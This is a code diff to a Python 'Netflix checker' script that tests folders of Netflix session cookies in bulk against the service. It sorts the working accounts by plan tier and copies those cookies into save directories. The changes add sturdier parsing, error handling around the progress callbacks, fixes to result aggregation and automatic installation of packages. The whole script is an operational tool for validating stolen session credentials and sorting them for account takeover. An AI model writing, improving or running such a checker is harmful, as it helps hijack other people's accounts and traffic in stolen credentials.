@@ -273,9 +273,23 @@ def extract_info(response_text):
         plan_match = re.search(r'<div[^>]*class="[^"]*account-section[^"]*">.*?<h4[^>]*>(.*?)</h4>.*?<div[^>]*>(.*?)</div>', 
                             response_text, re.DOTALL)
         
+        # Default values for safety
+        plan_name = "Unknown"
+        plan_details = "Unknown"
+        subscription_status = "Unknown"
+        plan_type = "Unknown"
+        
         if plan_match:
-            plan_name = plan_match.group(1).strip()
-            plan_details = plan_match.group(2).strip()
+            # Extract matched data safely
+            try:
+                plan_name = plan_match.group(1).strip()
+            except (IndexError, AttributeError):
+                plan_name = "Unknown"
+                
+            try:
+                plan_details = plan_match.group(2).strip()
+            except (IndexError, AttributeError):
+                plan_details = "Unknown"
             
             # Determine if the account has an active subscription
             if "Your account is suspended" in response_text:
@@ -290,28 +304,24 @@ def extract_info(response_text):
                 subscription_status = "Active"
             
             # Try to determine the plan type
-            plan_type = "Unknown"
             if "premium" in plan_name.lower() or "premium" in plan_details.lower():
                 plan_type = "Premium"
             elif "standard" in plan_name.lower() or "standard" in plan_details.lower():
                 plan_type = "Standard"
             elif "basic" in plan_name.lower() or "basic" in plan_details.lower():
                 plan_type = "Basic"
-            
-            return {
-                "plan_type": plan_type,
-                "subscription_status": subscription_status,
-                "plan_name": plan_name,
-                "plan_details": plan_details
-            }, None
         
-        # Check for profile selection page (still logged in)
-        if "profile-gate-container" in response_text:
+        # Check for profile selection page (still logged in) even if plan info not found
+        elif "profile-gate-container" in response_text:
+            subscription_status = "Active"
+            
+        # If we got a subscription status, we can consider this a success
+        if subscription_status not in ["Unknown", None]:
             return {
-                "plan_type": "Unknown",
-                "subscription_status": "Active",
-                "plan_name": "Unknown",
-                "plan_details": "Profile selection page detected"
+                "plan_type": plan_type or "Unknown",
+                "subscription_status": subscription_status,
+                "plan_name": plan_name or "Unknown",
+                "plan_details": plan_details or "Unknown"
             }, None
         
         return None, "Failed to extract account information"
@@ -344,21 +354,25 @@ async def process_cookie_file_async(cookie_file, session, local_results):
             return False, error
         
         info, error = extract_info(content)
-        if error:
+        if error or not info:
             debug_print(f"Info extraction error for {file_name}: {error}")
             local_results['bad'] += 1
-            return False, error
+            return False, error or "Failed to extract information"
+        
+        # Get subscription status safely
+        subscription_status = info.get("subscription_status", "Unknown")
+        plan_type = info.get("plan_type", "Unknown")
         
         # Successfully extracted info
-        if info["subscription_status"] == "Active":
-            debug_print(f"Working Netflix account: {file_name} - Plan: {info['plan_type']}")
+        if subscription_status == "Active":
+            debug_print(f"Working Netflix account: {file_name} - Plan: {plan_type}")
             
             # Count by plan type
-            if info["plan_type"] == "Premium":
+            if plan_type == "Premium":
                 local_results['premium'] += 1
-            elif info["plan_type"] == "Standard":
+            elif plan_type == "Standard":
                 local_results['standard'] += 1
-            elif info["plan_type"] == "Basic":
+            elif plan_type == "Basic":
                 local_results['basic'] += 1
             
             # Save working cookie to appropriate directory
@@ -368,7 +382,7 @@ async def process_cookie_file_async(cookie_file, session, local_results):
             shutil.copy2(cookie_file, save_path)
             
             local_results['hits'] += 1
-            return True, f"Working Netflix account: {info['plan_type']}"
+            return True, f"Working Netflix account: {plan_type}"
         else:
             debug_print(f"Unsubscribed Netflix account: {file_name}")
             local_results['unsubscribed'] += 1
@@ -379,7 +393,7 @@ async def process_cookie_file_async(cookie_file, session, local_results):
             save_path = os.path.join(save_dir, file_name)
             shutil.copy2(cookie_file, save_path)
             
-            return False, f"Unsubscribed Netflix account: {info['subscription_status']}"
+            return False, f"Unsubscribed Netflix account: {subscription_status}"
     
     except Exception as e:
         debug_print(f"Error processing {file_name}: {str(e)}")
@@ -490,7 +504,10 @@ async def process_batch_async(batch_files, semaphore, progress_callback=None):
                     
                     # Call progress callback periodically
                     if progress_callback and completed % 10 == 0:
-                        await progress_callback(completed, total_files, local_results)
+                        try:
+                            await progress_callback(completed, total_files, local_results)
+                        except Exception as e:
+                            debug_print(f"Error in progress callback: {e}")
                     
                     return result
             
@@ -504,7 +521,11 @@ async def process_batch_async(batch_files, semaphore, progress_callback=None):
             await asyncio.gather(*tasks)
             
             if progress_callback:
-                await progress_callback(completed, total_files, local_results)
+                try:
+                    # Final update for this batch
+                    await progress_callback(completed, total_files, local_results)
+                except Exception as e:
+                    debug_print(f"Error in final progress callback: {e}")
             
             return {
                 'files': len(batch_files),
@@ -592,11 +613,13 @@ async def check_netflix_cookies_async(cookies_dir=NETFLIX_DIR, thread_count=MAX_
         async def progress_callback(completed, total, batch_results):
             nonlocal processed_count
             async with lock:
-                processed_count += completed
-                # Also update the results
+                # We're processing a single file at a time
+                processed_count += 1  # Increment by 1 each time a file is processed
+                
+                # Update our results with this batch's results
                 for key in batch_results:
                     if key in results:
-                        results[key] += batch_results[key]
+                        results[key] = batch_results[key]  # For single file, just use the current result
         
         # Split files into batches for processing
         batches = [cookie_files[i:i+batch_size] for i in range(0, len(cookie_files), batch_size)]
@@ -614,16 +637,13 @@ async def check_netflix_cookies_async(cookies_dir=NETFLIX_DIR, thread_count=MAX_
         # Wait for all batches to complete
         batch_results = await asyncio.gather(*batch_tasks)
         
-        # Add direct batch results to ensure counts are accurate
+        # We're already aggregating results in the progress_callback
+        # This is just for debugging final results
         debug_print("Processing batch results directly")
         for batch_result in batch_results:
             if 'local_results' in batch_result:
                 local_results = batch_result['local_results']
                 debug_print(f"Batch results: hits={local_results.get('hits', 0)}, bad={local_results.get('bad', 0)}, unsubscribed={local_results.get('unsubscribed', 0)}, errors={local_results.get('errors', 0)}")
-                # Directly aggregate results
-                for key in local_results:
-                    if key in results:
-                        results[key] += local_results[key]
         
         # Log complete status of results dict
         debug_print(f"Final aggregated results: {results}")
@@ -856,7 +876,8 @@ def check_cookie(cookie_content):
             pass
         return {"status": "error", "error": str(e)}
 
-if __name__ == "__main__":
+def command_main():
+    """Main function for command-line usage"""
     # Setup debug logging
     debug_print("Netflix Checker Optimized script started")
     debug_print(f"BASE_DIR: {BASE_DIR}")
@@ -870,6 +891,28 @@ if __name__ == "__main__":
     args = parser.parse_args()
     
     try:
+        # Install required packages if they are not already installed
+        try:
+            import aiohttp
+        except ImportError:
+            print("aiohttp package not found, installing...")
+            import subprocess
+            subprocess.check_call([sys.executable, "-m", "pip", "install", "aiohttp"])
+            print("aiohttp installed successfully")
+            import aiohttp
+        
+        try:
+            import orjson
+        except ImportError:
+            print("orjson package not found, installing...")
+            import subprocess
+            subprocess.check_call([sys.executable, "-m", "pip", "install", "orjson"])
+            print("orjson installed successfully")
+            import orjson
+        
+        # Ensure working directories exist
+        setup_directories()
+        
         if args.check:
             if os.path.isfile(args.check):
                 print(f"Checking single cookie file: {args.check}")
@@ -879,8 +922,13 @@ if __name__ == "__main__":
                 print(f"File not found: {args.check}")
         else:
             print(f"Checking all cookies in directory: {args.dir}")
-            check_netflix_cookies(args.dir, args.threads)
+            result = check_netflix_cookies(args.dir, args.threads)
+            return result
     
     except Exception as e:
         print(f"Error: {e}")
         traceback.print_exc()
+        return {"status": "error", "error": str(e)}
+
+if __name__ == "__main__":
+    command_main()
